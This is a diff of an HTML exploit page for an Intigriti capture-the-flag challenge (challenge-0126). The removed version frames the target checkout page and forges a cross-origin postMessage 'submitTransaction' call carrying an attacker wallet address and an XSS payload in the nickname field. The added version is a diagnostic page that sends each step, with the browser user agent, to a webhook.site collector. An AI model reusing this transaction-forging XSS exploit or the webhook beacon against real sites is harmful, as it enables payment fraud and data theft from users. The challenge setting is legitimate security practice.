@@ -1,40 +1,52 @@
 <!DOCTYPE html>
-<html>
-<head><title>Exploit</title></head>
+<html><head><title>Diagnostic</title></head>
 <body>
-<pre id=log>Loading...</pre>
-<iframe id=x src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style=display:none></iframe>
+<h2>Step by Step Test</h2>
+<pre id=log></pre>
+<iframe id=x src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:100%;height:300px"></iframe>
 <script>
-const WEBHOOK = 'https://webhook.site/eee63a07-177d-4efd-8528-790a669c7cfa';
-const WALLET = '16472226db03703a192aa383237035a69f';
+const WEBHOOK = 'https://webhook.site/29343f11-0f99-4e28-b761-c1fff1028f35';
 const log = document.getElementById('log');
+let step = 0;
 
-function msg(s) { log.textContent += '\n' + s; console.log(s); }
+function report(stepName, data) {
+    step++;
+    const msg = `[Step ${step}] ${stepName}`;
+    log.textContent += '\n' + msg;
+    console.log(msg);
+    
+    fetch(WEBHOOK + '?step=' + step + '&name=' + stepName + '&data=' + btoa(JSON.stringify(data || {})))
+        .catch(() => new Image().src = WEBHOOK + '?step=' + step + '&name=' + stepName);
+}
 
-document.getElementById('x').onload = () => {
-    msg('[+] Iframe loaded');
+// Step 1: Page loaded
+report('PAGE_LOADED', {ua: navigator.userAgent});
 
-    setTimeout(() => {
-        msg('[+] Sending postMessage...');
+// Step 2: Iframe exists
+report('IFRAME_TAG_EXISTS', {src: document.getElementById('x').src});
 
-        document.getElementById('x').contentWindow.postMessage({
-            type: 'submitTransaction',
-            transaction: {
-                toAddress: WALLET,
-                currency: '1337COIN',
-                amount: 1,
-                nickname: '<img src=x onerror="alert(\'gigawatz\')">'
-            }
-        }, '*');
+// Step 3: Iframe load event
+document.getElementById('x').onload = function() {
+    report('IFRAME_ONLOAD_FIRED', {});
+    
+    // Step 4: Try to access contentWindow
+    setTimeout(function() {
+        try {
+            const cw = document.getElementById('x').contentWindow;
+            report('CONTENT_WINDOW_ACCESSIBLE', {hasWindow: !!cw});
+            
+            // Step 5: Try postMessage
+            cw.postMessage({test: 'hello'}, '*');
+            report('POSTMESSAGE_SENT', {});
+            
+        } catch(e) {
+            report('CONTENT_WINDOW_ERROR', {error: e.message});
+        }
+    }, 1000);
+};
 
-        msg('[+] Payload sent!');
-        msg('[+] Wallet: ' + WALLET);
-
-        setTimeout(() => {
-            msg('[+] Redirecting to marketwatch...');
-            window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
-        }, 2000);
-    }, 2000);
+document.getElementById('x').onerror = function() {
+    report('IFRAME_ONERROR', {});
 };
 </script>
 </body>
